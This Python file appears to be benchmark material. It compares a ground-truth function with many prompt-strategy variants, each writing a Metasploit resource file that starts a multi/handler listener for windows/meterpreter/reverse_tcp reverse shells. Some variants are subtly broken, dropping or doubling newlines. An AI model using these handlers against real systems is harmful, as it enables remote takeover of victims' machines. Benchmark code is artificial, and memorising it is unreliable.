import re
import os
import ipaddress

def ground_truth_code_setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

def persona_setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')
        file.write('setg DisablePayloadHandler 1\n')

def template_setupHandler(configFile, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/multi/handler\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write('set LPORT ' + str(lport) + '\n')
            file.write('set LHOST ' + lhost + '\n')
            file.write('exploit -j -z\n')
            file.write('setg DisablePayloadHandler 1\n')
    except Exception as e:
        return {'error': str(e)}

def question_refinement_write_config_file(lhost, lport, handler, payloads):
    if not isinstance(lhost, str) or not isinstance(lport, int) or not isinstance(handler, str) or not isinstance(payloads, list):
        raise ValueError('Invalid input types provided.')
    try:
        with open('exploit_config.txt', 'w') as file:
            file.write(f'listener: {lport}\n')
            file.write(f'handler: {handler}\n')
            file.write('payloads:\n')
            for payload in payloads:
                file.write(f'  - {payload}\n')
    except IOError as e:
        print(f'An error occurred while writing the file: {e}')


def alternative_approaches_setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')
        file.write('setg DisablePayloadHandler 1\n')

def context_manager_setupHandler(configFile, lhost, lport):
    payload = 'windows/meterpreter/reverse_tcp'
    configLines = [
        'use exploit/multi/handler\n',
        'set payload ' + payload + '\n',
        'set LPORT ' + str(lport) + '\n',
        'set LHOST ' + lhost + '\n',
        'exploit -j -z\n',
        'setg DisablePayloadHandler 1\n'
    ]
    with open(configFile, 'w') as file:
        for line in configLines:
            file.write(line + '\n')

def iterative_prompting_3_setup_handler(config_file, lhost, lport):
    import os
    import re
    if not isinstance(config_file, str) or not re.match(r'^.+\.conf$', config_file):
        raise ValueError('config_file must be a string representing a path to a .conf file')
    if not isinstance(lhost, str) or lhost == '':
        raise ValueError('lhost must be a non-empty string')
    if not isinstance(lport, int) or lport <= 0:
        raise ValueError('lport must be a positive integer')
    lhost = re.sub(r';', '', lhost)
    try:
        with open(config_file, 'w') as f:
            f.write('use exploit/multi/handler\n')
            f.write('set payload windows/meterpreter/reverse_tcp\n')
            f.write(f'set LPORT {lport}\n')
            f.write(f'set LHOST {lhost}\n')
            f.write('exploit -j -z\n')
            f.write('setg DisablePayloadHandler 1\n')
    except OSError as e:
        print(f'File system error: {e}')
    except Exception as e:
        print(f'An unexpected error occurred: {e}')

def iterative_prompting_4_setup_handler(config_file, lhost, lport):
    if not config_file or not lhost or not isinstance(lport, int):
        raise ValueError('Invalid input provided to iterative_prompting_4_setup_handler')
    try:
        with open(config_file, 'w') as file:
            file.write('use exploit/multi/handler\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write(f'set LPORT {lport}\n')
            file.write(f'set LHOST {lhost}\n')
            file.write('exploit -j -z\n')
            file.write('setg DisablePayloadHandler 1\n')
    except IOError as e:
        print(f'An error occurred while writing to the file: {e}')
    except Exception as e:
        print(f'An unexpected error occurred: {e}')

def iterative_prompting_5_setupHandler(configFile, lhost, lport):
    if not isinstance(configFile, str) or not isinstance(lhost, str) or not isinstance(lport, int):
        raise ValueError('Invalid input parameters')
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/multi/handler')
            file.write('set payload windows/meterpreter/reverse_tcp')
            file.write(f'set LPORT {lport}')
            file.write(f'set LHOST {lhost}')
            file.write('exploit -j -z')
            file.write('setg DisablePayloadHandler 1')
    except FileNotFoundError:
        raise FileNotFoundError('The configFile path does not exist')
    except PermissionError:
        raise PermissionError('You do not have permissions to write to the configFile')
    except ValueError as ve:
        raise ve
    except Exception as e:
        print(f'An error occurred: {e}')

def few_shots_prompting_setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')
        file.write('setg DisablePayloadHandler 1\n')

def cot_prompting_setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write(f'set LPORT {lport}')
        file.write(f'set LHOST {lhost}')
        file.write('exploit -j -z')
        file.write('setg DisablePayloadHandler 1\n')

def fact_check_list_setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')
        file.write('setg DisablePayloadHandler 1\n')

def not_interactive_mix_setupHandler(configFile, lhost, lport):
    try:
        with open(configFile, 'w') as file:
            file.write('use exploit/multi/handler\n')
            file.write('set payload windows/meterpreter/reverse_tcp\n')
            file.write(f'set LPORT {lport}\n')
            file.write(f'set LHOST {lhost}\n')
            file.write('exploit -j -z\n')
            file.write('setg DisablePayloadHandler 1\n')
    except Exception as e:
        print(f"Error writing to config file: {e}")

def baseline_setupHandler(configFile, lhost, lport):
    with open(configFile, 'w') as file:
        file.write('use exploit/multi/handler\n')
        file.write('set payload windows/meterpreter/reverse_tcp\n')
        file.write('set LPORT ' + str(lport) + '\n')
        file.write('set LHOST ' + lhost + '\n')
        file.write('exploit -j -z\n')
        file.write('setg DisablePayloadHandler 1\n')

